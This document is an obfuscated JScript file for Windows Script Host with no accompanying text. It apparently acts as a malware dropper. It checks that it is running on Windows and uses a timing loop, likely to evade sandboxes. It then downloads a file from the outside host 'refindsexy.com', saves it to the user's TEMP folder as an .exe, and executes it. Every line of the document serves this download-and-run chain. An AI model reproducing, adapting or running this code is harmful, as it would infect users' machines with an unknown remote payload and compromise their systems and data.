var i = false;
var xf = "CreateObject";
var x = function Ea() {return WScript[xf]("WScript.Shell");}(), S = 11;
var e = "MSXML2.XMLHTTP";
var d0 = 2123213;
var Eh = 0;
function U(g){x["Run"](g, Eh, Eh);};
function u(){return "" + e;};
function G(uQ, mh){Eh = Eh * 1; return uQ - mh;};
function SU(){return xf;};
/*@cc_on
  @if (@_win32 || @_win64)
    i = true;
  @end
@*/
if (i)
{
var FT = "";
function H(){return 22;};
var KW = 0; var U0 = 0;
function kt()
{
var K = new this["Date"]();
var QH = K["getUTCMilliseconds"]();
WScript["Sleep"](H());
var K = new this["Date"]();
var Fz = K["getUTCMilliseconds"]();
WScript["Sleep"](H());
var K = new this["Date"]();
var t = K["getUTCMilliseconds"]();
var KW = "D";
KW = G(Fz, QH);
var U0 = "H0";
U0 = G(t, Fz);
FT = "open";
return G(KW, U0);
}
var LX = false;
var c = false;
for (var eu = Eh; eu < H() * 1; eu++){if (kt() != Eh){
LX = true; 
U0 = "31" + 11 * KW + U0; 
c = true; 
break;
}}
function iM() {return ((LX == true) && (LX == c)) ? 1 : Eh;};
if (LX && iM() && c){
function F() {return x["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "isWpY1bqb.exe";};
 Oh = u();
 D0 = WScript[xf](Oh);
 var P = 1;
 while (P){
try {
D0[FT]("GET", "http://refindsexy.com/i8eps", false);
D0["send"]();
d = "Sleep";
for (;;){WScript[d](H() * 11); if (D0["readystate"] >= 2 * 2) break;};
P = Eh;
} catch(NF){};
}
function wx(E) {var WZ = (1, 2, 3, 4, 5, E); return WZ;};
sr = WScript[SU()]("ADODB.Stream");
Oh = sr;
Oh[FT]();
Oh["type"] = wx(1);
Oh["write"](D0["ResponseBody"]);
sr["position"] = wx(Eh);
Oh["Save" + "ToFile"](F(), 2);
sr["c"+"lose"]();
dT = F();
U(dT);
}
}

